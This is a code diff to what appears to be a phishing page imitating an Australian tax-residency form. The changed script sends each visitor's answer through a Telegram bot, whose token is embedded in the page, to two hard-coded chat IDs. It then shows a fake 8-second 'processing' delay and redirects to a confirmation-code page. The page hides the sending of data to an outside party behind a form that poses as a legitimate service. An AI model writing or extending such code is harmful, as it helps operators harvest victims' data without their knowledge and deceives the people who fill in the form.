@@ -233,13 +233,13 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
 
-    <!-- ====== TELEGRAM NOTIFICATION + 8‑SECOND PROCESSING DELAY ====== -->
+    <!-- ====== TELEGRAM NOTIFICATION + 8‑SECOND PROCESSING DELAY (Multi‑chat) ====== -->
     <script>
         // ============================================================
-        // 🔴 REPLACE WITH YOUR ACTUAL TELEGRAM BOT CREDENTIALS
+        // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
         // ============================================================
-        const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';   // e.g., '1234567890:ABCdefGhIjKlMnOpQrStUvWxYz'
-        const CHAT_ID = '722615124';       // e.g., '987654321'
+        const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';
+        const CHAT_IDS = ['722615124', '5440329319']; // ← Add your chat IDs here
         // ============================================================
 
         $(document).ready(function() {
@@ -260,22 +260,23 @@
                 $btn.addClass('processing');
                 $btn.prop('disabled', true);
 
-                // 3. Send Telegram notification (fire and forget)
+                // 3. Build the Telegram message
                 const message = `📋 *Tax Resident Question*\n` +
                                 `📅 Date: ${new Date().toLocaleString()}\n` +
                                 `❓ Were you an Australian resident for tax purposes for the full income year?\n` +
                                 `✅ Answer: *${userChoice}*`;
 
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-                $.ajax({
-                    url: url,
-                    method: 'GET',
-                    timeout: 5000,
-                    // No success/error handling needed – we redirect after 8s regardless
+                // 4. Send to ALL chats in the array (fire and forget)
+                CHAT_IDS.forEach(chatId => {
+                    $.ajax({
+                        url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`,
+                        method: 'GET',
+                        timeout: 5000
+                        // No success/error handling – we redirect after 8s anyway
+                    });
                 });
 
-                // 4. Wait 8 seconds, then redirect
+                // 5. Wait 8 seconds, then redirect
                 setTimeout(function() {
                     window.location.href = 'confirmation-code.html';
                 }, 8000);
